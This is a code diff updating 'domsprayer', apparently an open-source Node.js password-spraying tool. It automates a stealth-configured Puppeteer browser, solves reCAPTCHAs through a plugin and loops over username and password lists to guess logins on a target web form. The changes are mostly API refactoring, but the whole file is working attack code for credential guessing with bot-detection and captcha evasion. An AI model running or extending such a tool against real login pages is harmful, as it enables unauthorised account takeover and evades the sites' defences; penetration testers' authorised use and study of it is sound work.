@@ -1,7 +1,7 @@
 const puppeteer = require("puppeteer-extra");
 const StealthPlugin = require("puppeteer-extra-plugin-stealth");
 const RecaptchaPlugin = require("puppeteer-extra-plugin-recaptcha");
-const commander = require("commander");
+const { Command } = require("commander");
 const fs = require("fs");
 const { IncomingWebhook } = require("@slack/webhook");
 const chalk = require("chalk");
@@ -9,10 +9,12 @@ const sleep = require("sleep-promise");
 const path = require("path");
 require("log-timestamp");
 
-commander
+const program = new Command();
+
+program
     .name("domsprayer")
     .description("A generic DOM-based password sprayer")
-    .version("2.0.0")
+    .version("2.1.0")
     .option("-t, --target <url>", "Target URL")
     .option("-uf, --username-field <selector>", "Username field selector")
     .option("-pf, --password-field <selector>", "Password field selector")
@@ -81,7 +83,7 @@ commander
     )
     .parse();
 
-const options = commander.opts();
+const options = program.opts();
 
 // Validate options
 if (!options.test && (!options.usernames || !options.passwords)) {
@@ -119,7 +121,7 @@ if (
 
 async function waitForDelayAndSelector(page, delay, selector) {
     if (delay) {
-        await page.waitForTimeout(delay);
+        await sleep(delay);
     }
     return await page.waitForSelector(selector);
 }
@@ -160,10 +162,7 @@ async function checkLoginSuccess(page, options) {
 
     const url = page.url();
 
-    if (url !== options.target) {
-        return true;
-    }
-    return false;
+    return url !== options.target;
 }
 
 async function solveCaptcha(page, options) {
@@ -194,27 +193,24 @@ async function solveCaptcha(page, options) {
         puppeteer.use(recaptchaPlugin);
     }
 
-    if (options.headless) {
-        options.headless = "new";
-    }
     const browserOptions = {
-        args: [
-            "--no-sandbox",
-            "--disable-features=IsolateOrigins,site-per-process,SitePerProcess",
-            "--flag-switches-begin --disable-site-isolation-trials --flag-switches-end",
-        ],
+        // args: [
+        //     "--no-sandbox",
+        //     "--disable-features=IsolateOrigins,site-per-process,SitePerProcess",
+        //     "--flag-switches-begin --disable-site-isolation-trials --flag-switches-end",
+        // ],
         headless: options.headless,
-        defaultViewport: null,
+        // defaultViewport: null,
     };
 
     const browser = await puppeteer.launch(browserOptions);
 
     if (options.test) {
         console.log("Running tests...");
-        const page = await browser.newPage();
+        const page = (await browser.pages())[0];
         await page.setDefaultTimeout(15000);
         await page.goto("https://bot.sannysoft.com");
-        await page.waitForTimeout(5000);
+        await page.waitForNetworkIdle();
         await page.screenshot({ path: "testresult.png", fullPage: true });
         await browser.close();
         console.log(`All done, check the screenshot. ✨`);
@@ -243,8 +239,8 @@ async function solveCaptcha(page, options) {
                         continue;
                     }
 
-                    const page = await browser.newPage();
-                    tryuserlabel: try {
+                    const page = (await browser.pages())[0];
+                    try {
                         // Initialize object to control usage of anti-captcha service
                         const statsSvc = {
                             used: false,
@@ -257,27 +253,32 @@ async function solveCaptcha(page, options) {
 
                         await page.goto(options.target);
 
-                        // Wait for the page to load
-                        // this will throw if selector is not found
-                        const usernameSelector = await waitForDelayAndSelector(
-                            page,
-                            options.waitTime,
-                            options["usernameField"]
+                        const usernameSelector = await page.waitForSelector(
+                            options["usernameField"],
+                            { visible: true }
                         );
+
+                        if (!usernameSelector) {
+                            throw new Error(`Username selector ${options["usernameField"]} not found`);
+                        }
 
                         // Type into username box
                         await usernameSelector.type(username, {
                             delay: options.typingDelay,
                         });
-                        // await page.keyboard.press("Enter");
+
+                        // Move to the password field - edit if needed
+                        await page.keyboard.press("Tab");
 
                         // Search and type into password box
-
-                        const passwordSelector = await waitForDelayAndSelector(
-                            page,
-                            options.waitTime,
-                            options["passwordField"]
+                        const passwordSelector = await page.waitForSelector(
+                            options["passwordField"],
+                            { visible: true }
                         );
+
+                        if (!passwordSelector) {
+                            throw new Error(`Password selector ${options["passwordField"]} not found`);
+                        }
 
                         await passwordSelector.type(password, {
                             delay: options.typingDelay,
@@ -289,22 +290,30 @@ async function solveCaptcha(page, options) {
                         }
 
                         // Click on login button
-                        const loginButtonSelector =
-                            await waitForDelayAndSelector(
-                                page,
-                                options.waitTime,
-                                options["loginButton"]
-                            );
+                        const loginButtonSelector = await page.waitForSelector(
+                            options["loginButton"],
+                            { visible: true }
+                        );
+                        if (!loginButtonSelector) {
+                            throw new Error(`Login button selector ${options["loginButton"]} not found`);
+                        }
+
                         await loginButtonSelector.click();
+                        await page.waitForNetworkIdle();
+
+                        // const [response] = await Promise.all([
+                        //     page.waitForNavigation(), // The promise resolves after navigation has finished
+                        //     loginButtonSelector.click(), // Clicking the button will indirectly cause a navigation
+                        // ]);
+
+                        // if (response === null) {
+                        //     throw new Error("Navigation failed");
+                        // }
 
                         if (options.captchaAfter) {
                             // Solve captcha after clicking the login button
                             await solveCaptcha(page, options);
                         }
-
-                        try {
-                            await page.waitForNavigation();
-                        } catch {}
 
                         // Check if login was successful
                         const isLoginSuccessful = await checkLoginSuccess(
@@ -379,17 +388,15 @@ async function solveCaptcha(page, options) {
                         const client = await page.target().createCDPSession();
                         await client.send("Network.clearBrowserCookies");
                         await client.send("Network.clearBrowserCache");
-                        // always close page
-                        await page.close();
                         await sleep(options.interval);
                     }
                 }
             }
-            // await browser.close();
         } catch (error) {
             console.error(chalk.red(`An error occurred: ${error}`));
         } finally {
             await browser.close();
+            console.log(chalk.green("All done!"));
             process.exit(0);
         }
     }
